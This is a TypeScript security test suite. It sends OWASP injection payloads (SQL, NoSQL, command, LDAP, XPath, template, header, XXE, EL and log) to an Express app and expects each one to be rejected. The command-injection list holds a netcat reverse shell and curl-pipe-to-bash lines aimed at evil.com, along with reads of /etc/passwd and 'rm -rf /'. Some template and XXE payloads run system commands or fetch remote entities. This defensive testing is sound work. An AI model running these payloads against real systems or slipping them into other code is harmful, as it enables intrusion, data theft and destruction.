/**
 * OWASP A03:2021 - Injection Tests
 *
 * Task 80: Gap 6 - Security test suite
 *
 * Tests for injection vulnerabilities including:
 * - SQL injection
 * - NoSQL injection
 * - Command injection
 * - LDAP injection
 * - XPath injection
 * - Template injection
 * - Header injection
 */

import request from 'supertest';
import express, { Express } from 'express';

const createMockApp = (): Express => {
  const app = express();
  app.use(express.json());
  return app;
};

describe('OWASP A03:2021 - Injection', () => {
  let app: Express;

  beforeEach(() => {
    app = createMockApp();
  });

  describe('SQL Injection Tests', () => {
    const sqlInjectionPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users;--",
      "' UNION SELECT * FROM users--",
      "1' OR '1'='1' /*",
      "admin'--",
      "' OR 1=1--",
      "'; EXEC xp_cmdshell('dir');--",
      "' AND 1=(SELECT COUNT(*) FROM users)--",
      "1; SELECT * FROM information_schema.tables--",
      "' WAITFOR DELAY '0:0:5'--",
      "1' AND SLEEP(5)#",
      "' OR ''='",
    ];

    sqlInjectionPayloads.forEach(payload => {
      it(`should sanitize SQL injection in query params: ${payload.substring(0, 20)}...`, async () => {
        const response = await request(app)
          .get('/api/users/search')
          .query({ username: payload })
          .set('Authorization', 'Bearer valid-token');

        // Should not cause SQL error
        expect(response.status).not.toBe(500);
        // Should not return unexpected data
        if (response.status === 200) {
          expect(response.body.data).not.toContain('password');
          expect(response.body.data).not.toContain('secret');
        }
      });

      it(`should sanitize SQL injection in body: ${payload.substring(0, 20)}...`, async () => {
        const response = await request(app)
          .post('/api/auth/login')
          .send({ username: payload, password: 'test' });

        expect([400, 401, 403]).toContain(response.status);
      });

      it(`should sanitize SQL injection in path params: ${payload.substring(0, 20)}...`, async () => {
        const response = await request(app)
          .get(`/api/users/${encodeURIComponent(payload)}`)
          .set('Authorization', 'Bearer valid-token');

        expect([400, 404]).toContain(response.status);
      });
    });
  });

  describe('NoSQL Injection Tests', () => {
    const noSqlPayloads = [
      { '$gt': '' },
      { '$ne': null },
      { '$where': '1==1' },
      { '$regex': '.*' },
      { '$or': [{ 'username': 'admin' }, { '1': '1' }] },
      { 'username': { '$gt': '' } },
      { 'password': { '$regex': '.*' } },
      { '$where': 'function() { return true; }' },
    ];

    noSqlPayloads.forEach((payload, index) => {
      it(`should sanitize NoSQL injection payload ${index + 1}`, async () => {
        const response = await request(app)
          .post('/api/auth/login')
          .send(payload);

        expect([400, 401, 403]).toContain(response.status);
      });
    });

    it('should reject JSON with prototype pollution', async () => {
      const response = await request(app)
        .post('/api/user/settings')
        .set('Authorization', 'Bearer valid-token')
        .send({
          '__proto__': { 'isAdmin': true },
          'constructor': { 'prototype': { 'isAdmin': true } },
        });

      expect([400, 403]).toContain(response.status);
    });
  });

  describe('Command Injection Tests', () => {
    const commandPayloads = [
      '; ls -la',
      '| cat /etc/passwd',
      '`whoami`',
      '$(whoami)',
      '& ping -c 4 evil.com',
      '\n cat /etc/passwd',
      '| nc evil.com 1234 -e /bin/bash',
      '; rm -rf /',
      '&& curl http://evil.com/shell.sh | bash',
      '$(curl http://evil.com/shell.sh)',
      '`curl http://evil.com/shell.sh`',
    ];

    commandPayloads.forEach(payload => {
      it(`should sanitize command injection: ${payload.substring(0, 20)}...`, async () => {
        const response = await request(app)
          .post('/api/tools/ping')
          .set('Authorization', 'Bearer valid-token')
          .send({ host: `example.com${payload}` });

        // Should not execute commands
        expect(response.status).not.toBe(500);
        if (response.body.data) {
          expect(JSON.stringify(response.body.data)).not.toMatch(/root:/);
          expect(JSON.stringify(response.body.data)).not.toMatch(/\/bin\/bash/);
        }
      });

      it(`should reject command injection in filename: ${payload.substring(0, 15)}...`, async () => {
        const response = await request(app)
          .post('/api/files/upload')
          .set('Authorization', 'Bearer valid-token')
          .field('filename', `test${payload}.txt`)
          .attach('file', Buffer.from('test'), 'test.txt');

        expect([400, 403]).toContain(response.status);
      });
    });
  });

  describe('LDAP Injection Tests', () => {
    const ldapPayloads = [
      '*',
      '*)(&',
      '*)(uid=*))(|(uid=*',
      'admin)(&)',
      '*)((|userPassword=*)',
      'x*))%00',
    ];

    ldapPayloads.forEach(payload => {
      it(`should sanitize LDAP injection: ${payload}`, async () => {
        const response = await request(app)
          .get('/api/ldap/search')
          .query({ username: payload })
          .set('Authorization', 'Bearer valid-token');

        expect([400, 404]).toContain(response.status);
      });
    });
  });

  describe('XPath Injection Tests', () => {
    const xpathPayloads = [
      "' or '1'='1",
      "' or ''='",
      "admin' or '1'='1",
      "'] | //*[contains(name(),'admin')][1]/text()",
      "' or 1=1 or '",
    ];

    xpathPayloads.forEach(payload => {
      it(`should sanitize XPath injection: ${payload}`, async () => {
        const response = await request(app)
          .post('/api/xml/query')
          .set('Authorization', 'Bearer valid-token')
          .send({ xpath: payload });

        expect([400, 403]).toContain(response.status);
      });
    });
  });

  describe('Server-Side Template Injection (SSTI) Tests', () => {
    const sstiPayloads = [
      '{{7*7}}',
      '${7*7}',
      '<%= 7*7 %>',
      '#{7*7}',
      '*{7*7}',
      '{{constructor.constructor("return this")()}}',
      '{{config.items()}}',
      '${T(java.lang.Runtime).getRuntime().exec("id")}',
      '__proto__.constructor.constructor("return process.mainModule.require(\'child_process\').execSync(\'id\').toString()")()',
    ];

    sstiPayloads.forEach(payload => {
      it(`should sanitize SSTI: ${payload.substring(0, 20)}...`, async () => {
        const response = await request(app)
          .post('/api/template/render')
          .set('Authorization', 'Bearer valid-token')
          .send({ template: payload });

        // Should not evaluate the expression
        if (response.status === 200) {
          expect(response.body.data).not.toBe('49');
          expect(response.body.data).not.toContain('uid=');
        }
      });

      it(`should sanitize SSTI in user input: ${payload.substring(0, 15)}...`, async () => {
        const response = await request(app)
          .put('/api/user/profile')
          .set('Authorization', 'Bearer valid-token')
          .send({ displayName: payload });

        if (response.status === 200 && response.body.data?.displayName) {
          expect(response.body.data.displayName).toBe(payload);
          expect(response.body.data.displayName).not.toBe('49');
        }
      });
    });
  });

  describe('Header Injection Tests', () => {
    const headerInjectionPayloads = [
      'value\r\nX-Injected: malicious',
      'value\nSet-Cookie: evil=cookie',
      'value\r\n\r\n<html>injected</html>',
      'value%0d%0aX-Injected:%20malicious',
    ];

    headerInjectionPayloads.forEach(payload => {
      it(`should sanitize header injection: ${payload.substring(0, 25)}...`, async () => {
        const response = await request(app)
          .get('/api/redirect')
          .query({ url: payload })
          .set('Authorization', 'Bearer valid-token');

        // Should not have injected headers
        expect(response.headers['x-injected']).toBeUndefined();
        expect(response.headers['set-cookie']).not.toContain('evil=cookie');
      });
    });
  });

  describe('XML External Entity (XXE) Injection Tests', () => {
    const xxePayloads = [
      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><root>&xxe;</root>`,
      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>`,
    ];

    xxePayloads.forEach((payload, index) => {
      it(`should prevent XXE injection ${index + 1}`, async () => {
        const response = await request(app)
          .post('/api/xml/parse')
          .set('Content-Type', 'application/xml')
          .set('Authorization', 'Bearer valid-token')
          .send(payload);

        expect([400, 403]).toContain(response.status);
        // Should not expose file contents
        expect(response.text).not.toMatch(/root:/);
      });
    });
  });

  describe('Expression Language (EL) Injection Tests', () => {
    const elPayloads = [
      '${applicationScope}',
      '${pageContext.request.getSession().setAttribute("admin",true)}',
      '#{applicationScope}',
      '%{#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("X-Injected","true")}',
    ];

    elPayloads.forEach(payload => {
      it(`should sanitize EL injection: ${payload.substring(0, 25)}...`, async () => {
        const response = await request(app)
          .post('/api/search')
          .set('Authorization', 'Bearer valid-token')
          .send({ query: payload });

        expect([200, 400]).toContain(response.status);
        // Should not execute EL expressions
        expect(response.headers['x-injected']).toBeUndefined();
      });
    });
  });

  describe('Log Injection Tests', () => {
    const logInjectionPayloads = [
      'user123\n[ERROR] Fake error message',
      'user123\r\n[CRITICAL] System compromised',
      'user%0d%0a[ADMIN] Admin action performed',
    ];

    logInjectionPayloads.forEach(payload => {
      it(`should sanitize log injection: ${payload.substring(0, 25)}...`, async () => {
        const response = await request(app)
          .post('/api/auth/login')
          .send({ username: payload, password: 'test' });

        // Request should be processed without log pollution
        expect([400, 401]).toContain(response.status);
      });
    });
  });
});
